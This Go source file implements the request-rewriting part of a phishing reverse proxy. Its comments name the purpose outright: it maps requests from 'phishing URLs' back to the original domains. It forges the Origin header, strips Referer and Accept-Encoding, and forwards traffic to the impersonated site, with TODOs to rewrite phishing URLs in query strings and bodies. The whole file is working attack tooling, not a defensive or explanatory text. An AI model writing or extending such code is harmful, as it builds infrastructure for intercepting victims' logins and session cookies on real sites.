package main

import (
	"net/http"
	"net/url"
)

type RequestProcessor interface {
	Process(req *http.Request) *http.Request
}

func NewRequestProcessor(conv DomainConverter) RequestProcessor {
	return &requestProcessor{conv}
}

type requestProcessor struct {
	conv DomainConverter
}

// TODO patch query params (phishing URLs to original domains)
// TODO patch phishing URLs in body with original domains
func (p *requestProcessor) Process(r *http.Request) *http.Request {
	destURL := &url.URL{
		Scheme:   "https",
		Host:     p.conv.ToTarget(r.Host),
		Path:     r.URL.Path,
		RawQuery: r.URL.RawQuery,
	}
	req := &http.Request{
		Method: r.Method,
		Header: r.Header,
		Body:   r.Body,
		URL:    destURL,
	}
	origin := req.Header["Origin"]
	if len(origin) > 0 {
		req.Header["Origin"] = []string{p.conv.ToTarget(origin[0])}
	}
	req.Header.Del("Referer")
	req.Header.Del("Accept-Encoding")
	return req
}
